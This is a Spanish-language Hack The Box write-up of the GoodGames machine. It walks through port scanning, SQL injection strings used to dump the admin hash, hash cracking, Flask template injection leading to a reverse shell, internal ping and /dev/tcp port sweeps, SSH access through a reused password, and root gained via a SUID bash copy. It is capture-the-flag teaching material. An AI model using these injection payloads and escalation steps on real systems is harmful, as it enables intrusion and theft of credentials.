---
layout: single
title: GoodGames - Hack The Box
excerpt: "Ésta maquina me ha gustado bastante, ya que toca algunos temas bastante chulos. En la máquina GoodGames veremos SQL Injection, Hash Cracking, un bonito Server Side Template Injection e incluso un poco de pivoting, asi que vamos al lío."
date: 2022-03-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-GoodGames/GoodGames_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
   - hackthebox
   - infosec
tags:
    - linux
    - SQL Injection
    - Hash Cracking
    - SSTI
    - Pivoting
---

![](/assets/images/htb-writeup-GoodGames/GoodGames_logo.png)


# Reconocimiento


Comenzaremos con un reconocimiento basico del sistema al que nos estamos enfrentando, por lo que utilizaremos la herramienta **nmap**, para escanear todo el rango de puertos por **TCP**. La captura la meteremos en un fichero llamado `allPorts` en formato grepeable.

```bash

h3g0c1v@kali:~/htb/GoodGames$ nmap -p- -sS --min-rate 5000 -n -vvv -Pn 10.10.11.130 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 20:47 CET
Initiating SYN Stealth Scan at 20:47
Scanning 10.10.11.130 [65535 ports]
Discovered open port 80/tcp on 10.10.11.130
Completed SYN Stealth Scan at 20:47, 10.10s elapsed (65535 total ports)
Nmap scan report for 10.10.11.130
Host is up, received user-set (0.032s latency).
Scanned at 2022-03-15 20:47:30 CET for 10s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)


```

Y vemos que tiene el puerto **80** abierto. Después le lanzare unos scripts basicos de enumeracion y detectaremos la version y servicio para dicho puerto, donde el output lo metere en el fichero `targeted`.

```bash

h3g0c1v@kali:~/htb/GoodGames$ nmap -sCV -p80 10.10.11.130 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 20:49 CET
Nmap scan report for goodgames.htb (10.10.11.130)
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds


```
Vemos que hay un dominio, por lo que lo añadire al fichero `/etc/hosts/` para que resuelva a la máquina víctima.

```bash

h3g0c1v@kali:~/htb/GoodGames$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

10.10.11.130	goodgames.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


```

Seguiremos con el reconocimiento del puerto 80 y, con la herramienta **whatweb**, inspeccionaremos un poco mas la página.

```bash

h3g0c1v@kali:~/htb/GoodGames$ whatweb http://10.10.11.130
http://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]

```

En este punto vamos a visitar la página web tanto con la **IP** , como con el **dominio**.

![](/assets/images/htb-writeup-GoodGames/WebIP.png)

![](/assets/images/htb-writeup-GoodGames/webdomain.png)

Y bueno, vemos que no hay diferencia alguna, por lo que me quedare con la **IP**.

Vemos que arriba a la derecha hay un icono como de logueo, asi que pincharemos en él a ver si nos podemos loguear.

![](/assets/images/htb-writeup-GoodGames/signin.png)

# SQL Injection


Voy a intentar un SQL Injection, por lo que para capturar la **data** que se envía usare la herramienta **BurpSuite**.

![](/assets/images/htb-writeup-GoodGames/burpCAP.png)

Intentare una simple inyección SQL: `' or 1=1-- -`.

![](/assets/images/htb-writeup-GoodGames/burpSQLI.png)

Y ¡ojo! vemos que es vulnerable a inyecciones SQL, asi que dumpeare la base de datos, para pillar el **hash** de la cuenta del **adminsitrador**.

Para ello realizare las siguientes inyecciones.

	- email=' union select 1,2,3,4-- -&password=cds -> Ver el campo al que se muestra por pantalla.
	- email=' union select 1,2,3,database()-- -&password=cds -> Ver la base de datos en uso.
	- email=' union select 1,2,3,(table_name) from information_schema.tables where table_schema="main"-- -&password=cds -> Ver las tablas de la base de datos **main**.
	- email=' union select 1,2,3,(column_name) from information_schema.columns where table_schema="main" and table_name="user"-- -&password=cds -> Ver las columnas que hay en la base de datos **main** cuya tabla se llama **user**.

Por ultimo ya dumpearemos las credenciales del administrador y los usuarios que dispone la base de datos.

![](/assets/images/htb-writeup-GoodGames/dumpAdmin.png)


# Cracking

Ahora que tenemos el hash, intentaremos crackearlo con el uso de **raimbowtables**.

![](/assets/images/htb-writeup-GoodGames/crackhash.png)

Y la tenemos, asi que nos loguearemos como administrador de la página.

![](/assets/images/htb-writeup-GoodGames/adminlogin.png)


# SSTI


Ahora que estamos como **Administrador** nos aparece un icono como de ajustes, asi que vamos a pinchar a ver donde nos lleva.

![](/assets/images/htb-writeup-GoodGames/settingsadmin.png)

Y vemos que nos lleva a un dominio que no teniamos: *internal-administration.goodgames.htb*, asi que lo añadiré a mi `/etc/hosts/` y volvere a intentar meterme.

![](/assets/images/htb-writeup-GoodGames/adminpanel.png)

Si intentamos loguearnos con alguna credencial tipica, encontraremos que el usuario **admin** y la contraseña **superadministrator** son válidas.

![](/assets/images/htb-writeup-GoodGames/loginadminpanel.png)

Ahora que estamos dentro del panel de administración voy a ver que dice el **wappalizer** . Lo mas interesante que nos dice es que esta corriendo **Flask** por detras, asi que voy a ver si puedo realizar un **Server Side Template Injection (SSTI)**.

Si buscamos un poco mas por la página, veremos que podemos cambiar el nombre del usuario. Aquí es donde intentare realizar un **SSTI**.

![](/assets/images/htb-writeup-GoodGames/ssti.png)

Y parece que si podemos. En este punto voy a ver si puedo ver archivos de la máquina víctima.

![](/assets/images/htb-writeup-GoodGames/lfissti.png)

¡Podemos!, ahora solo queda ver si tenemos ejecución remota de comandos.

![](/assets/images/htb-writeup-GoodGames/rcessti.png)


# Ganando Acceso a la Máquina Víctima


¡Genial!, observamos que tenemos **RCE** , asi que me entablare una **reverse shell** a mi equipo.

![](/assets/images/htb-writeup-GoodGames/reverseshell.png)

Una vez dentro haremos un tratamiento de la **tty** para obtener una **shell** completamente interactiva.

![](/assets/images/htb-writeup-GoodGames/tty.png)

Y exportaremos las dos variables, además de ajustar las filas y columnas de la terminal, para terminar de obtener la **tty interactiva**.

![](/assets/images/htb-writeup-GoodGames/exporttty.png)

En este punto podemos ir al directorio `/home/augustus` y visualizar la `user.txt`.

```bash

root@3a453ab39d3d:/backend# cat /home/augustus/user.txt 
24dd973d2561f1344ed1fb62a3ead878

```

Si miramos donde estamos, nos daremos cuenta que estamos en un contenedor, asi que voy a ver que **IP** tiene conectividad este contenedor, dentro de su misma subred.

```bash

root@3a453ab39d3d:/backend# for host in {1..254}; do (ping -c 1 172.19.0.${host} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.047 ms
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.075 ms

```

Vemos que tenemos dos **hosts** con conectividad, ahora veremos que puertos tienen abiertos cada uno, con otro simple script.

```bash

root@3a453ab39d3d:/backend# for port in {1..65535}; do echo '' > /dev/tcp/172.19.0.1/$port && echo "Puerto: $port - OPEN"; done 2>/dev/null
Puerto: 22 - OPEN
Puerto: 80 - OPEN
root@3a453ab39d3d:/backend# for port in {1..65535}; do echo '' > /dev/tcp/172.19.0.2/$port && echo "Puerto: $port - OPEN"; done 2>/dev/null
Puerto: 8085 - OPEN
Puerto: 34144 - OPEN
Puerto: 45960 - OPEN

```

Como la **172.19.0.1** tiene el puerto **22** abierto, vamos a probar a conectarnos con el usuario **augustus** y ver si han reutilizado la contraseña del panel de aminitracion que vimos anteriormente, introduciendole la contraseña de **superadministrator**.


```bash

root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ whoami
augustus
augustus@GoodGames:~$ hostname -I
10.10.11.130 172.19.0.1 172.17.0.1 dead:beef::250:56ff:feb9:6c20 

```

Y genial, se ve que han reutilizado credenciales, por lo que nos hemos conseguido loguear como **augustus**.


# Root


En este punto ya que tenemos un contenedor **rooteado** podemos copia la `/bin/bash` al directorio de **augustus** y establecerle permisos **SUID**.

Como ahora tenemos la **bash** con permisos **SUID** podemos realizar el comando **bash -p** y nos pondriamos como **root**.

![](/assets/images/htb-writeup-GoodGames/bashroot.png)

Es importante que lo hagamos copiando la `/bin/bash` del host **172.19.0.1**, ya que si no nos aparecera el siguiente error

![](/assets/images/htb-writeup-GoodGames/errorbash.png)

Si lo hemos hecho bien podremos irnos al directorio `/root/` y visualizar la `root.txt`.

![](/assets/images/htb-writeup-GoodGames/roottxt.png)

Espero que te haya gustado este *write-up* de la máquina **GoodGames**.
